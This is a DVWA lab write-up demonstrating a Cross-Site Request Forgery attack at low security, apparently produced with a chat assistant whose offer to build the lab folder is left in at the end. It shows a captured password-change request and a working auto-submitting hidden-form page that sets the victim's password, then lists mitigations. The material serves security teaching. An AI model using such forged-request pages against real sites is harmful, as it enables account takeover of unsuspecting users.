# DVWA CSRF Lab (Low Difficulty)

## Overview
This lab demonstrates a **Cross-Site Request Forgery (CSRF)** attack on DVWA at **Low security level**. CSRF is a web vulnerability that allows an attacker to trick a logged-in user into performing actions they did not intend, such as changing their password.  

At **low difficulty**, DVWA has **no protection against CSRF**, making it vulnerable to attacks via crafted links or hidden forms.

---

## Objective
- Make the current user change their password **without their knowledge**.
- Exploit the absence of CSRF tokens and session verification.
- Use basic social engineering to trick the user into visiting a malicious link or page.

---

## Conditions for CSRF
For a successful CSRF attack:
1. **Relevant Action:** There must be an action on the site (e.g., change password form).  
2. **Session Handling:** Site relies on **cookie-based sessions** for authentication.  
3. **No Unpredictable Parameters:** No CSRF token or unpredictable request parameter is required to validate the request.  

At low security, all three conditions are met.

---

## Steps to Perform the Attack

### 1. Setup DVWA
1. Set **DVWA Security → Low**.  
2. Go to **CSRF module**.  
3. Inspect the **Change Password** form:  

```html
<form action="vulnerabilities/csrf/" method="POST">
  New Password: <input type="text" name="password">
  Confirm Password: <input type="text" name="password_conf">
  <input type="submit" value="Change">
</form>
````

---

### 2. Capture the Request with Burp Suite

1. Open **Burp Suite → Proxy → Intercept**.
2. Submit a normal password change in DVWA.
3. Intercepted POST request example:

```http
POST /DVWA/vulnerabilities/csrf/ HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=abc123; security=low
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

password=test123&password_conf=test123
```

---

### 3. Craft Malicious CSRF Page

Create an HTML page (`csrf_attack.html`) that submits the request automatically:

```html
<html>
  <body>
    <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="POST" id="csrfForm">
      <input type="hidden" name="password" value="hacked123">
      <input type="hidden" name="password_conf" value="hacked123">
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```

* **action:** DVWA CSRF URL
* **hidden inputs:** set the new password
* **script:** auto-submits the form

---

### 4. Test the Attack

1. Open the crafted `csrf_attack.html` while logged in as the victim.
2. DVWA processes the request and changes the password to `hacked123`.
3. Confirm by logging in with the new password.

---

## Notes

* Low security DVWA **does not have CSRF tokens**, making this attack straightforward.
* Medium/High security levels **require CSRF tokens or referrer validation**, which prevent direct attacks.
* CSRF attacks exploit **trust in the user's browser** rather than a flaw in the server itself.

---

## Mitigation

To prevent CSRF attacks:

1. Use **CSRF tokens** in all forms.
2. Validate the **Referer header** to ensure requests originate from your domain.
3. Implement **SameSite cookies** for session management.

---

## References

* [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)
* DVWA Documentation

```

---

If you want, I can also **create the full lab folder** with `csrf_attack.html` and this `README.md` ready for submission.  

Do you want me to do that?
```

